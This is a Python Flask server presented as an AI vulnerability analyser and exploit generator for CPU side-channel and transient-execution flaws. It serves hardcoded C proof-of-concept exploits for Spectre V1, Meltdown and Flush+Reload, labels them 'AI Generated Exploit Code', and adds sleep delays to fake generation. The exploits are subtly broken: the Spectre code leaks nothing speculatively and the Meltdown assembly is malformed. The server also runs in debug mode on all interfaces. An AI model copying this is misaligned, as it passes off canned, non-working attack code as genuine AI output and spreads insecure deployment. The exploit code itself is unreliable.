from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import os
import tempfile
import time

app = Flask(__name__)
CORS(app)

UPLOAD_FOLDER = tempfile.gettempdir()
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

vulnerabilities_db = {
    'Spectre V1': {
        'type': '瞬态执行漏洞',
        'attack': 'Spectre类攻击',
        'risk': '高危',
        'description': '边界检查绕过，利用分支预测错误泄露敏感数据'
    },
    'Meltdown': {
        'type': '瞬态执行漏洞',
        'attack': 'Meltdown类攻击',
        'risk': '高危',
        'description': '利用乱序执行机制，在用户态读取内核态内存'
    },
    'Foreshadow': {
        'type': '瞬态执行漏洞',
        'attack': 'Meltdown类攻击',
        'risk': '高危',
        'description': '针对Intel SGX Enclave的L1缓存攻击'
    },
    'ZombieLoad': {
        'type': '瞬态执行漏洞',
        'attack': 'Meltdown类攻击',
        'risk': '中危',
        'description': '利用填充缓冲区泄露跨线程数据'
    },
    'Retbleed': {
        'type': '瞬态执行漏洞',
        'attack': 'Spectre类攻击',
        'risk': '低危',
        'description': '利用返回指令的分支预测历史泄露信息'
    },
    'RIDL': {
        'type': '瞬态执行漏洞',
        'attack': 'Meltdown类攻击',
        'risk': '中危',
        'description': 'Rogue In-Flight Data Load，CPU内部缓冲区数据泄露'
    },
    'CacheOut': {
        'type': '瞬态执行漏洞',
        'attack': 'Meltdown类攻击',
        'risk': '中危',
        'description': '利用L1数据缓存的逐出机制跨安全边界泄露数据'
    },
    'BHI': {
        'type': '瞬态执行漏洞',
        'attack': 'Spectre类攻击',
        'risk': '高危',
        'description': 'Branch History Injection，分支历史注入攻击'
    },
    'Flush+Reload': {
        'type': '侧信道漏洞',
        'attack': 'Cache侧信道攻击',
        'risk': '高危',
        'description': '利用冲刷指令探测缓存行重用，测量访问时间差泄露信息'
    },
    'Prime+Probe': {
        'type': '侧信道漏洞',
        'attack': 'Cache侧信道攻击',
        'risk': '高危',
        'description': '利用驱逐集探测缓存组竞争推断敏感信息'
    },
    'PLATYPUS': {
        'type': '侧信道漏洞',
        'attack': 'Power侧信道攻击',
        'risk': '中危',
        'description': 'RAPL功耗接口泄漏，利用处理器功耗遥测提取敏感信息'
    },
    'HertzBleed': {
        'type': '侧信道漏洞',
        'attack': 'Timing侧信道攻击',
        'risk': '中危',
        'description': 'DVFS动态电压频率缩放泄漏，利用频率变化时序差异提取密钥'
    }
}

exp_templates = {
    'Spectre V1': '''/*
 * Spectre V1 - Boundary Check Bypass
 * AI Generated Exploit Code
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define CACHE_HIT_THRESHOLD 80
#define DELTA 4096

unsigned char array[256 * 4096];
volatile uint64_t timing;

uint64_t measure_access_time(volatile uint8_t *addr) {
    uint64_t start, end;
    start = __rdtsc();
    volatile uint8_t temp = *addr;
    end = __rdtsc();
    return end - start;
}

void flush_cache(volatile uint8_t *addr) {
    _mm_clflush(addr);
}

int spectre_v1_attack(char *secret_data, size_t secret_len) {
    printf("[*] Starting Spectre V1 attack...\\n");
    
    for (int i = 0; i < 256; i++) {
        array[i * DELTA] = i;
    }
    
    for (int trial = 0; trial < 100; trial++) {
        for (int i = 0; i < secret_len; i++) {
            flush_cache(&array[secret_data[i] * DELTA]);
        }
        
        for (int i = 0; i < 100; i++) {
            _mm_mfence();
        }
        
        for (int i = 0; i < 256; i++) {
            uint64_t time = measure_access_time(&array[i * DELTA]);
            if (time < CACHE_HIT_THRESHOLD) {
                printf("[+] Found byte: 0x%02x ('%c')\\n", i, (i > 31 && i < 127) ? i : '?');
                return 1;
            }
        }
    }
    
    return 0;
}

int main(int argc, char *argv[]) {
    char secret[] = "SECRET_KEY_123";
    printf("[*] Target secret: %s\\n", secret);
    
    int result = spectre_v1_attack(secret, strlen(secret));
    
    if (result) {
        printf("[+] Attack successful!\\n");
    } else {
        printf("[-] Attack failed.\\n");
    }
    
    return 0;
}''',
    
    'Meltdown': '''/*
 * Meltdown - Rogue Data Cache Load
 * AI Generated Exploit Code
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static volatile uint8_t *kernel_addr;

void meltdown_attack(uint64_t addr) {
    uint8_t data = 0;
    
    printf("[*] Attempting to read kernel memory at 0x%lx\\n", addr);
    
    asm volatile(
        "movq %%r15, 0x1000000\\n\\t"
        "movq %%r15, 0x1001000\\n\\t"
        "movb (%0), %%al\\n\\t"
        "shlb $0x10, %%al\\n\\t"
        "movb %%al, (%1)\\n\\t"
        : 
        : "r"(addr), "r"(&data)
        : "rax", "r15", "memory"
    );
    
    printf("[+] Read data: 0x%02x\\n", data);
}

int main(int argc, char *argv[]) {
    printf("[*] Meltdown PoC\\n");
    printf("[!] This requires kernel with KPTI disabled\\n");
    
    uint64_t test_addr = 0xffffffffff600000ULL;
    meltdown_attack(test_addr);
    
    return 0;
}''',
    
    'Flush+Reload': '''/*
 * Flush+Reload - Cache Side Channel Attack
 * AI Generated Exploit Code
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <emmintrin.h>

#define THRESHOLD 100

uint64_t flush_reload(uint8_t *addr) {
    uint64_t time1, time2;
    
    _mm_clflush(addr);
    
    _mm_mfence();
    
    time1 = __rdtsc();
    volatile uint8_t temp = *addr;
    time2 = __rdtsc();
    
    _mm_mfence();
    
    return time2 - time1;
}

int main(int argc, char *argv[]) {
    uint8_t shared_data = 0x41;
    uint8_t *target = &shared_data;
    
    printf("[*] Flush+Reload Attack PoC\\n");
    
    for (int i = 0; i < 10; i++) {
        uint64_t time = flush_reload(target);
        printf("[*] Access time: %lu cycles\\n", time);
        
        if (time < THRESHOLD) {
            printf("[+] Cache hit detected!\\n");
        } else {
            printf("[-] Cache miss\\n");
        }
    }
    
    return 0;
}'''
}

def analyze_code_for_vulnerabilities(code_content, filename):
    results = []
    code_lower = code_content.lower()
    
    vuln_patterns = {
        '时序侧信道': ['timing', 'memcmp', 'strcmp', 'time', 'clock', 'rdtsc'],
        '缓冲区溢出': ['strcpy', 'strcat', 'sprintf', 'gets', 'scanf', 'memcpy'],
        '竞态条件': ['access', 'open', 'race', 'toctou'],
        '整数溢出': ['length', 'size', 'overflow', 'add', 'malloc'],
        '内存泄漏': ['malloc', 'alloc', 'free', 'leak']
    }
    
    lines = code_content.split('\\n')
    for vuln_type, patterns in vuln_patterns.items():
        for pattern in patterns:
            if pattern in code_lower:
                for i, line in enumerate(lines, 1):
                    if pattern in line.lower():
                        severity = 'high' if vuln_type in ['缓冲区溢出', '内存泄漏'] else 'medium'
                        results.append({
                            'file': filename,
                            'line': i,
                            'function': 'unknown',
                            'vulnType': vuln_type,
                            'severity': severity,
                            'description': f'Potential {vuln_type} vulnerability detected',
                            'code': line.strip()[:100]
                        })
                        break
    
    return results[:10]

def generate_exp_for_vuln(vuln_type, code_context):
    vuln_key = None
    for key in exp_templates.keys():
        if key.lower() in vuln_type.lower() or vuln_type.lower() in key.lower():
            vuln_key = key
            break
    
    if vuln_key:
        return exp_templates[vuln_key]
    
    return exp_templates['Spectre V1']

@app.route('/api/analyze', methods=['POST'])
def analyze_code():
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file provided'}), 400
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({'error': 'Empty filename'}), 400
        
        filename = file.filename
        code_content = file.read().decode('utf-8', errors='ignore')
        
        print(f"[*] Analyzing file: {filename}")
        
        vulnerabilities = analyze_code_for_vulnerabilities(code_content, filename)
        
        time.sleep(1)
        
        response = {
            'success': True,
            'filename': filename,
            'total_vulns': len(vulnerabilities),
            'vulnerabilities': vulnerabilities,
            'message': f'Analysis complete. Found {len(vulnerabilities)} potential vulnerabilities.'
        }
        
        return jsonify(response)
    
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/generate-exp', methods=['POST'])
def generate_exp():
    try:
        data = request.json
        vuln_type = data.get('vulnType', 'Unknown')
        code_context = data.get('codeContext', '')
        
        print(f"[*] Generating EXP for vulnerability type: {vuln_type}")
        
        exp_code = generate_exp_for_vuln(vuln_type, code_context)
        
        time.sleep(1.5)
        
        response = {
            'success': True,
            'vulnType': vuln_type,
            'expCode': exp_code,
            'message': 'EXP code generated successfully'
        }
        
        return jsonify(response)
    
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({'status': 'ok', 'message': 'AI Analysis Server Running'})

if __name__ == '__main__':
    print("[*] Starting AI Vulnerability Analysis Server...")
    print("[*] Server running on http://localhost:5000")
    app.run(host='0.0.0.0', port=5000, debug=True)
